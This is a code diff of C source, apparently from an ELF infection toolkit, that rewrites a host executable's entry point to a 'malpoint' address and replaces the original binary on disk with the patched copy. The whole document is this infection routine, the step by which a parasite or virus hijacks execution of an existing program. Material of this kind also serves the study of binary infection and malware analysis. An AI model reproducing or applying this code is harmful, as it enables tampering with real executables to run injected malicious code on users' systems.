@@ -1,35 +1,29 @@
 #include "elfit.h"
 
-int entry_redirect(char *host, unsigned long malpoint)
+int entry_redirect(Elfit_t *host, unsigned long malpoint)
 {
-    int hfd;
-    struct stat hst;
-    unsigned char *mem;
+    int ofd, c;
     Elf32_Ehdr *ehdr;
     
+    printf("Patching host's entrypoint to 0x%02x\n", malpoint);
 
-    if ((hfd = open(host, O_WRONLY)) == -1)
-    {
-        perror("open host");
-        return -1;
-    }
-
-    if (fstat(hfd, &hst))
-    {
-        perror("fstat host");
-        return -1;
-    }
-
-    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
-    if (mem == MAP_FAILED)
-    {
-        perror("mmap");
-        return -1;
-    }
-
-    ehdr = (Elf32_Ehdr *) mem;
+    ehdr = (Elf32_Ehdr *) host->mem;
 
     ehdr->e_entry = malpoint;
 
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
+        < 0)
+    {
+        perror("tmp binary: open");
+        return -1; 
+    }
+
+    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("tmp binary: write");
+        return -1;
+    }
+
+    rename(TMP, host->name);
     return 1;
 }
